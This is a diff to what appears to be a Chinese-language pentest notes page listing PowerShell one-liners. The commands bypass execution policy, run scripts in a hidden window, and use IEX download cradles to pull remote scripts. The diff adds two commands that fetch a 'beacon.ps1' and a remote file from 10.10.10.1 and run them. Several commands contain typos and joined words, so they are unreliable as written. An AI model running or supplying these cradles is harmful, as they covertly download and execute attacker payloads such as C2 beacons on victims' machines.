@@ -16,6 +16,8 @@
 <p><strong>绕过本地权限执行：</strong>PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1</p>
 <p><strong>本地隐藏绕过权限执行脚本：</strong>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Nonlnteractive -NoProfile -File xxx.ps1</p>
 <p><strong>用IEX下载远程PS1脚本绕过权限执行：</strong>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(“xxx.ps1”);[Parameters]</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe IEX (New-Object System.Net.Webclient).DownloadFile(&#x27;http://10.10.10.1:1234/beacon.ps1&#x27;,&#x27;C:\www\beacon.ps1&#x27;)</span><br><span class="line"></span><br><span class="line">powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.10.1:80/download/file.ext&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <!--`ExecutionPolicy Bypass`绕过执行安全策略-->
 
 <!--`WindowStyle Hidden`隐藏窗口-->
